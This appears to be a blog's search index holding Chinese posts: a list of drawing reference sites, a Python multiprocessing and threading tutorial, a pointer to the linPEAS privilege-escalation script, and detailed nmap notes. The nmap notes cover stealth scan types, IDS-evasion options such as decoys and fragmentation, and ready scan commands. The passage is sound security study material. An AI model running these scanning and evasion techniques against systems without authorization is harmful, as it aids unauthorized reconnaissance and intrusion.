<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>绘画网站推荐</title>
      <link href="/2021/08/09/%E7%BB%98%E7%94%BB%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/"/>
      <url>/2021/08/09/%E7%BB%98%E7%94%BB%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<p>brusheezy（免费笔刷网站）<a href="http://www.brusheezy.com/">www.brusheezy.com</a><br>itsnicethat (插画师创作分享网站)  <a href="http://www.itsnicethat.com/">www.itsnicethat.com</a><br>xuehuahua (基础教程) <a href="http://www.xuehuahua.cc/">www.xuehuahua.cc</a></p><p>mixkit (优秀插画作品参考) <a href="https://mixkit.co/free-stock-art">https://mixkit.co/free-stock-art</a><br>皮克斯 （摄影作品参考） <a href="http://www.pexels.com/">www.pexels.com</a><br>500px  （无版权照片素材网）<a href="https://500px.com.cn/">https://500px.com.cn</a></p><p>pixivic  （p站镜像站小粉红） <a href="http://www.pixivic.com/">www.pixivic.com</a><br>GGAC  （国内权威的 CG网站）<a href="http://www.ggac.com/v2/home">www.ggac.com/v2/home</a><br>cgsociety （美国权威的 CG网站）<a href="http://www.cgsociety.org/">www.cgsociety.org</a></p><p>花瓣 站酷 微元素 堆糖 知妖直接搜索名字就好</p><p>bodiesinmotion （人物动态与表情参考）<a href="http://www.bodiesinmotion.photo/">www.bodiesinmotion.photo</a><br>getbodysmart  （人体骨骼肌肉神经系统）<a href="http://www.getbodysmart.com/">www.getbodysmart.com</a><br>line-of-action  (人物 动物速写练习)   <a href="https://line-of-action.com/">https://line-of-action.com</a></p><p>chojugiga （动物拟人参考）<a href="http://www.chojugiga.com/">www.chojugiga.com</a><br>pixelsquid （各种物体画法参考）<a href="http://www.pixelsquid.com/png">www.pixelsquid.com/png</a><br>microsculpture  （各种昆虫图片）<a href="http://www.microsculpture.net/">www.microsculpture.net</a><br>withawish  （燕尾服参考网站）<a href="http://www.withawish.jp/">www.withawish.jp</a><br>uenoya （霸道总裁长外套） <a href="https://long-coat.uenoya.jp/">https://long-coat.uenoya.jp</a></p><p>musinsa  （练习速写和褶皱）<a href="https://m.store.musinsa.com/app/styles/lists">https://m.store.musinsa.com/app/styles/lists</a><br>|screenmusings （电影图的参考网站）<a href="http://www.screenmusings.org/">www.screenmusings.org</a><br>Filmgrab  （全世界的电影截图）<a href="https://film-grab.com/">https://Film-grab.com</a><br>impawards （电影海报素材）<a href="http://www.impawards.com/">http://www.impawards.com/</a></p><p>nipponcolors （日本配色网站） <a href="https://nipponcolors.com/">https://nipponcolors.com/</a><br>coolors  （新手配色网站） <a href="https://coolors.co/">https://coolors.co/</a><br>Yorke Antique Textiles（纹理图案网站） <a href="https://www.yorkeantiquetextiles.com/">https://www.yorkeantiquetextiles.com/</a><br>loftcn (房屋设计网站)  <a href="https://loftcn.com/">https://loftcn.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 绘画 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python 进程与线程</title>
      <link href="/2021/07/29/python-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
      <url>/2021/07/29/python-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>使用多进程和多线程最好的方式是使用<code>Master-Worker</code>的设计模式</p><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><p><strong>多进程</strong>不共享内存空间，所以变量将会拷贝一份副本到新的进程中。</p><p>进程可以在不同的CPU核心上切换，Unix使用的底层的<code>fork()</code>函数，而windows支持的并不好，所以只能最大限度模拟。</p><p>通用的封装模块有两个。<code>subprocess</code>和<code>multiprocessing</code></p><p>调用外部程序使用的是<code>subprocess</code>，而创建新的进程往往使用的是<code>multiprocessing</code></p><h3 id="调用外部程序"><a href="#调用外部程序" class="headerlink" title="调用外部程序"></a>调用外部程序</h3><p>当调用的外部程序不需要复杂交互的时候，可以使用<code>call</code>方法直接创建子进程，然后得到返回。<br><code>call</code>方法是拥塞的，将会等到子进程结束才会继续执行父进程。</p><p>当调用的外部程序有复杂交互的时候，可以使用<code>Popen</code>方法。<br><code>Popen</code>方法是非拥塞的。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess</span><span class="line">r = subprocess.call([<span class="hljs-string">&#x27;nslookup&#x27;</span>, <span class="hljs-string">&#x27;python.org&#x27;</span>])</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Exit code:&#x27;</span>, r)</span></code></pre></div></div><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> subprocess</span><span class="line">p = subprocess.Popen([<span class="hljs-string">&#x27;nslookup&#x27;</span>], stdin=subprocess.PIPE,</span><span class="line">                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><span class="line"></br></span><span class="line">output, error = p.communicate(<span class="hljs-string">b&#x27;setq=mx\npython.org\nexit\n&#x27;</span>)</span><span class="line"><span class="hljs-built_in">print</span>(output.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>))</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return Code:&#x27;</span>, p.returncode)</span></code></pre></div></div><h3 id="创建子进程"><a href="#创建子进程" class="headerlink" title="创建子进程"></a>创建子进程</h3><p>创建子进程也有两种方式，一种是用<code>multiprocessing.Process</code>进行单次创建，另一种就是使用<code>multiprocessing.Pool</code>创建一个池，然后管理池中子进程.</p><h4 id="multiprocessing-Process"><a href="#multiprocessing-Process" class="headerlink" title="multiprocessing.Process"></a>multiprocessing.Process</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process</span><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_child</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    sleep(<span class="hljs-number">1</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run child name %s, pid is %s&#x27;</span> % (name, os.getpid()))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())</span><span class="line marked">    p = Process(target=run_child, args=(<span class="hljs-string">&#x27;test&#x27;</span>,))</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;start child process&#x27;</span>)</span><span class="line">    p.start()  <span class="hljs-comment"># 会自动调用run_child函数</span></span><span class="line">    p.join()  <span class="hljs-comment"># 会等待子进程结束后再继续往下运行</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process end&#x27;</span>)</span></code></pre></div></div><h4 id="multiprocessing-Pool"><a href="#multiprocessing-Pool" class="headerlink" title="multiprocessing.Pool"></a>multiprocessing.Pool</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool, cpu_count</span><span class="line"><span class="hljs-keyword">import</span> os</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">long_time_wait</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Run task %s, pid is %s&quot;</span> % (name, os.getpid()))</span><span class="line">    start_time = time.time()</span><span class="line">    time.sleep(random.random() * <span class="hljs-number">3</span>)</span><span class="line">    end_time = time.time()</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Task %s runs %0.2f sec&quot;</span> % (name, (end_time - start_time)))</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Parent pid is %s&quot;</span> % os.getpid())</span><span class="line marked">    p = Pool(cpu_count())  <span class="hljs-comment"># 这个是进程池，默认是CPU核数，可以自己指定</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;subprocess Start&quot;</span>)</span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):</span><span class="line marked">        p.apply_async(long_time_wait, args=(i,))  <span class="hljs-comment"># 这个是异步的，异步的执行，不会阻塞当前的进程</span></span><span class="line">        <span class="hljs-comment"># p.apply(long_time_wait, args=(1,))  # 这个是同步的，同步的执行，会阻塞当前的进程</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before close&#x27;</span>)</span><span class="line">    p.close() <span class="hljs-comment"># 在join()之前必须close()</span></span><span class="line">    p.join()</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All subprocess done&quot;</span>)</span></code></pre></div></div><h3 id="进程间通讯"><a href="#进程间通讯" class="headerlink" title="进程间通讯"></a>进程间通讯</h3><p>进程间的通讯使用的是<code>multiprocessing.Queue</code>队列</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Queue</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">q</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]:</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Put %s in queue&#x27;</span> % value)</span><span class="line marked">        q.put(value)</span><span class="line">        time.sleep(random.random() * <span class="hljs-number">3</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">q</span>):</span></span><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:</span><span class="line marked">        value = q.get(<span class="hljs-literal">True</span>)</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Get %s from queue&#x27;</span> % value)</span><span class="line">        time.sleep(<span class="hljs-number">0.1</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:</span><span class="line">    q = Queue()</span><span class="line">    pw = Process(target=write, args=(q,))</span><span class="line">    pr = Process(target=read, args=(q,))</span><span class="line">    pw.start()</span><span class="line">    pr.start()</span><span class="line">    pw.join()</span><span class="line">    pr.terminate() <span class="hljs-comment"># 由于read是死循环，需要强制结束</span></span></code></pre></div></div><p><code>Process</code>中有<code>terminate</code>方法强制结束，但是线程中没有。</p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p><strong>多线程</strong>共享一个内存空间，调用的变量也是同一个。</p><p>多线程python支持的不错，但是以下几点必须注意：</p><ol><li>在读写全局变量的时候必须加入线程锁，并且确保释放</li><li>多线程的变量<strong>传参</strong>使用<code>threading.Local</code>对象</li><li>python的多线程只能利用一核，要使用多核就必须要用到多进程了</li></ol><h3 id="不带读写的多线程创建"><a href="#不带读写的多线程创建" class="headerlink" title="不带读写的多线程创建"></a>不带读写的多线程创建</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"><span class="hljs-keyword">import</span> time</span><span class="line"><span class="hljs-keyword">import</span> random</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loop</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s&#x27;</span> % threading.current_thread().name)</span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):</span><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s &gt;&gt;&gt; %s&#x27;</span> % (threading.current_thread().name, i))</span><span class="line">        time.sleep(random.random())</span><span class="line"></br></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread name %s Done&#x27;</span> % threading.current_thread().name)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Main thread: &#x27;</span>, threading.current_thread().name)</span><span class="line marked">t = threading.Thread(target=loop, name=<span class="hljs-string">&#x27;LoopThread&#x27;</span>)</span><span class="line">t.start()</span><span class="line">t.join()</span><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Main thread %s Done&#x27;</span> % threading.current_thread().name)</span></code></pre></div></div><h3 id="读写带进程锁的多线程创建"><a href="#读写带进程锁的多线程创建" class="headerlink" title="读写带进程锁的多线程创建"></a>读写带进程锁的多线程创建</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 假定这是你的银行存款:</span></span><span class="line">balance = <span class="hljs-number">0</span></span><span class="line marked">lock = threading.Lock()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_it</span>(<span class="hljs-params">n</span>):</span></span><span class="line">    <span class="hljs-comment"># 先存后取，结果应该为0:</span></span><span class="line">    <span class="hljs-keyword">global</span> balance</span><span class="line">    balance = balance + n</span><span class="line">    balance = balance - n</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_thread</span>(<span class="hljs-params">n</span>):</span></span><span class="line">    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000000</span>):</span><span class="line marked">        lock.acquire()</span><span class="line marked">        <span class="hljs-keyword">try</span>:</span><span class="line marked">            change_it(n)</span><span class="line marked">        <span class="hljs-keyword">finally</span>:</span><span class="line marked">            lock.release()</span><span class="line"></br></span><span class="line"></br></span><span class="line">t1 = threading.Thread(target=run_thread, args=(<span class="hljs-number">5</span>,))</span><span class="line">t2 = threading.Thread(target=run_thread, args=(<span class="hljs-number">8</span>,))</span><span class="line">t1.start()</span><span class="line">t2.start()</span><span class="line">t1.join()</span><span class="line">t2.join()</span><span class="line"><span class="hljs-built_in">print</span>(balance)</span></code></pre></div></div><h3 id="Local-传递变量"><a href="#Local-传递变量" class="headerlink" title="Local 传递变量"></a>Local 传递变量</h3><p>使用local其实是省略了<code>dict[threading.current_thread()]</code>，来保证取到的变量是本线程的变量</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"></br></span><span class="line">local_s = threading.local()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_thread</span>(<span class="hljs-params">name</span>):</span></span><span class="line">    local_s.name = name</span><span class="line">    proc_name()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proc_name</span>():</span></span><span class="line">    name = local_s.name</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s, thread: %s&quot;</span> % (name, threading.current_thread().name))</span><span class="line"></br></span><span class="line"></br></span><span class="line">p1 = threading.Thread(target=start_thread, args=(<span class="hljs-string">&quot;p1&quot;</span>,), name=<span class="hljs-string">&quot;Thread_1&quot;</span>)</span><span class="line">p2 = threading.Thread(target=start_thread, args=(<span class="hljs-string">&quot;p2&quot;</span>,), name=<span class="hljs-string">&quot;Thread_2&quot;</span>)</span><span class="line">p1.start()</span><span class="line">p2.start()</span><span class="line">p1.join()</span><span class="line">p2.join()</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linpeas 使用</title>
      <link href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>linpeas是用shell脚本编写的本地提权检查清单，<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">github</a></p><p>使用命令已收录至<a href="https://github.com/Elinpf/cmder">cmder</a></p><p><img src="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap 使用</title>
      <link href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><ol><li><code>-sn</code> 只判断主机是否在线，不扫描端口</li><li><code>-sV</code> 判断服务软件版本</li><li><code>-O</code> 判断操作系统</li><li><code>-Pn</code> 当主机禁ping后使用，否则会被跳过</li><li><code>-A</code> 强力检测，包含以下：</li></ol><p>服务版本识别（-sV）<br>操作系统识别（-O）<br>脚本扫描（-sC）<br>Traceroute（–traceroute）</p><h2 id="TCP扫描选项"><a href="#TCP扫描选项" class="headerlink" title="TCP扫描选项"></a>TCP扫描选项</h2><ol><li><p>TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行<strong>完整的三次握手</strong>。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三 次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来。如果启动 Nmap的用户的权限不足，那么默认情况下Nmap程序将以这种模式进行扫描。</p></li><li><p>​SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将<strong>使用含有SYN标志位</strong>的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常好。而且由于这种模式不会进行三次握手，所以<strong>是一种十分隐蔽的扫描方式。如果启动Nmap的用户有高级别权限，那么在默认情况下Nmap程序将以这种模式进行扫描。</strong></p></li><li><p>TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位；FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。</p></li><li><p>TCP Maimon扫描（-sM）：Uriel Maimon 首先发现了TCP Maimom扫描方式。这种模式的探测数据包含有FIN/ACK标识。对于BSD衍生出来的各种操作系统来说，如果被测端口处于 开放状态，主机将会丢弃这种探测数据包；如果被测端口处于关闭状态，那么主机将会回复 RST。</p></li><li><p>TCPACK扫描（-sA）：这种扫描模式可以<strong>检测目标系统是否采用了数据包状态监测技术（stateful）防火墙</strong>，并能确定哪些端口被防火墙屏蔽。这种类型的数据包只有一个ACK标识位。如果目标主机的回复中含有RST标识，则说明目标主机没有被过滤。</p></li><li><p>TCP窗口扫描（-sW）：这种扫描方式检测目标返回的RST数据包的TCP窗口字段。如果目标端口处于开放状态，这个字段的值将是正值；否则它的值应当是0。</p></li><li><p>TCP Idle扫描（-sI）：采用这种技术后，您将通过指定的僵尸主机发送扫描数据包。本机并不与目标主机直接通信。如果对方网络里有IDS，IDS将认为发起扫描的主机是僵尸主机。</p></li></ol><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><p>UDP扫描只有一个<code>-sU</code>选项，由于Linux内核只能进行1秒1次的UDP报文发送，所以必须有针对性的优化扫描</p><ol><li>对常见端口进行扫描</li><li>并行扫描</li><li>在防火墙后方扫描</li><li>使用–host-timeout跳过超时主机</li></ol><h2 id="端口目标选项"><a href="#端口目标选项" class="headerlink" title="端口目标选项"></a>端口目标选项</h2><ul><li><code>-p</code> 指定端口</li><li><code>-F</code> 快速扫描，仅扫描常用的100个端口</li><li><code>-r</code> 顺序扫描，不随机</li><li><code>--top-ports</code> 扫描排名前N的端口</li><li><code>--port-ratio</code> 扫描前百分比的端口</li></ul><h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><ul><li>sV 打开版本探测</li><li><code>--version-intensity &lt;intensity&gt;</code> 设置版本扫描强度, 设置强度的值在 0~9之间，默认是7</li></ul><h2 id="输出选项"><a href="#输出选项" class="headerlink" title="输出选项"></a>输出选项</h2><ol><li>-oN Normal，不显示runtime和警告信息</li><li>-oX xml</li><li>-oG gnmap，方便Grep</li><li>-oA 以上三种一起输出</li></ol><h2 id="时间排程控制"><a href="#时间排程控制" class="headerlink" title="时间排程控制"></a>时间排程控制</h2><p>-T 有6个等级</p><p>paranoid（0）：每5分钟发送一次数据包，且不会以并行方式同时发送多组数据。这种模式的扫描不会被IDS检测到。</p><p>sneaky（1）：每隔15秒发送一个数据包，且不会以并行方式同时发送多组数据。</p><p>polite（2）：每0.4秒发送一个数据包，且不会以并行方式同时发送多组数据。</p><p>normal（3）：此模式同时向多个目标发送多个数据包，为    Nmap默认的模式，该模式能自动在扫描时间和网络负载之间进行平衡。</p><p>aggressive（4）：在这种模式下，Nmap    对每个既定的主机只扫描5分钟，然后扫描下一台主机。它等待响应的时间不超过1.25秒。</p><p>insane（5）：在这种模式下，Nmap对每个既定的主机仅扫描74秒，然后扫描下一台主机。它等待响应的时间不超过0.3秒。</p><h2 id="脚本引擎"><a href="#脚本引擎" class="headerlink" title="脚本引擎"></a>脚本引擎</h2><p>NSE(Nmap Script Engine)可以扩展nmap的使用范围，并且用户可以自定义自己的脚本实现针对性的扫描</p><p>-sC 或–script=default：启动默认类NSE脚本。</p><p>在Kali Linux系统中，Nmap脚本位于目录/usr/share/nmap/scripts。</p><p><code>--script &lt;filename&gt;|&lt;category&gt;|&lt;directories&gt;</code>：根据指定的文件名、类别名、目录名，执行相应的脚本。</p><p><code>--script-args &lt;args&gt;</code> ：这个选项用于给脚本指定参数。例如，在使用认证类脚本时，可通过这个选项指定用户名和密码</p><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">auth</td><td align="center">此类脚本使用暴力破解等技术找出目标系统上的认证信息。</td></tr><tr><td align="center">default</td><td align="center">启用–sC 或者-A 选项时运行此类脚本。这类脚本同时具有: 执行速度快；输出的信息有指导下一步操作的价值；输出信息内容丰富、形式简洁；必须可靠；不会侵入目标系统；能泄露信息给第三方。</td></tr><tr><td align="center">discovery</td><td align="center">该类脚本用于探索网络。</td></tr><tr><td align="center">dos</td><td align="center">该类脚本可能使目标系统拒绝服务，请谨慎使用。</td></tr><tr><td align="center">exploit</td><td align="center">该类脚本利用目标系统的安全漏洞。在运行这类脚本之前，渗透测试人员需要获取 被测单位的行动许可。</td></tr><tr><td align="center">external</td><td align="center">该类脚本可能泄露信息给第三方。</td></tr><tr><td align="center">fuzzer</td><td align="center">该类脚本用于对目标系统进行模糊测试。</td></tr><tr><td align="center">instrusive</td><td align="center">该类脚本可能导致目标系统崩溃，或耗尽目标系统的所有资源。</td></tr><tr><td align="center">malware</td><td align="center">该类脚本检査目标系统上是否存在恶意软件或后门。</td></tr><tr><td align="center">safe</td><td align="center">该类脚本不会导致目标服务崩溃、拒绝服务且不利用漏洞。</td></tr><tr><td align="center">version</td><td align="center">配合版本检测选项（-sV），这类脚本对目标系统的服务程序进行深入的版本检 测。</td></tr><tr><td align="center">vuln</td><td align="center">该类脚本可检测检査目标系统上的安全漏洞。</td></tr></tbody></table><ul><li>–script-help 打印帮助</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap --script-help <span class="hljs-string">&quot;(vuln) and *smb*&quot;</span></span></code></pre></div></div><h2 id="规避检测选项"><a href="#规避检测选项" class="headerlink" title="规避检测选项"></a>规避检测选项</h2><p>真实环境中探测目标往往都在IDS之后，所以有必要针对网络环境选择规避检测的选项</p><p>-f（使用小数据包）：这个选项可避免对方识别出我们探测的数据包。指定这个选项之后， Nmap将使用8字节甚至更小数据体的数据包。</p><p>–mtu：这个选项用来调整数据包的包大小。MTU（Maximum    Transmission Unit，最大传输单元）必须是8的整数倍，否则Nmap将报错。</p><p>-D（诱饵）：这个选项应指定假    IP，即诱饵的IP。启用这个选项之后，Nmap    在发送侦测 数据包的时候会掺杂一些源地址是假IP（诱饵）的数据包。这种功能意在以藏木于林的方法 掩盖本机的真实    IP。也就是说，对方的log还会记录下本机的真实IP。您可使用RND生成随机 的假IP地址，或者用RND：number的参数生成N个假IP地址。您所指定的诱饵主机 应当在线，否则很容易击溃目标主机。另外，使用了过多的诱饵可能造成网络拥堵。尤其是在扫描客户的网络的时候，您应当极力避免上述情况。</p><p><code>--source-port &lt;portnumber&gt;</code>或-g（模拟源端口）：如果防火墙只允许某些源端口的入站流量，这个选项就非常有用。</p><p>–data-length：这个选项用于改变Nmap    发送数据包的默认数据长度，以避免被识别出来是Nmap的扫描数据。</p><p>–max-parallelism：这个选项可限制Nmap并发扫描的最大连接数。</p><p><code>--scan-delay &lt;time&gt;</code>：这个选项用于控制发送探测数据的时间间隔，以避免达到IDS/IPS端 口扫描规则的阈值。</p><h2 id="常用命令构造"><a href="#常用命令构造" class="headerlink" title="常用命令构造"></a>常用命令构造</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="常见端口扫描"><a href="#常见端口扫描" class="headerlink" title="常见端口扫描"></a>常见端口扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -T4 <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><h4 id="HTTP端口扫描"><a href="#HTTP端口扫描" class="headerlink" title="HTTP端口扫描"></a>HTTP端口扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -p80,443,8000-8100,8443 -T4 <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><h4 id="数据库中top1000端口扫描"><a href="#数据库中top1000端口扫描" class="headerlink" title="数据库中top1000端口扫描"></a>数据库中top1000端口扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -sV -sC -O -T4 -n -Pn -oA fastscan <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><p>使用版本扫描(-sV),使用default脚本(-sC),开启系统版本检测(-O),扫描强度4级(-T4),不递归DNS(-n),不检测主机是否ping通(-Pn),全文件类型输出(-oA)</p><h4 id="将检测到打开的端口放在环境变量中"><a href="#将检测到打开的端口放在环境变量中" class="headerlink" title="将检测到打开的端口放在环境变量中"></a>将检测到打开的端口放在环境变量中</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 <span class="hljs-comment">#&#123;RHOST&#125; | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s/,$//)</span></span></code></pre></div></div><h3 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h3><h4 id="查找脚本并打印使用说明"><a href="#查找脚本并打印使用说明" class="headerlink" title="查找脚本并打印使用说明"></a>查找脚本并打印使用说明</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-comment"># 搜索default version safe 类型的模块</span></span><span class="line">locate -r <span class="hljs-string">&#x27;\.nse$&#x27;</span> | xargs grep categories | grep <span class="hljs-string">&#x27;default\|version\|safe&#x27;</span> | grep <span class="hljs-comment">#&#123;module&#125;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 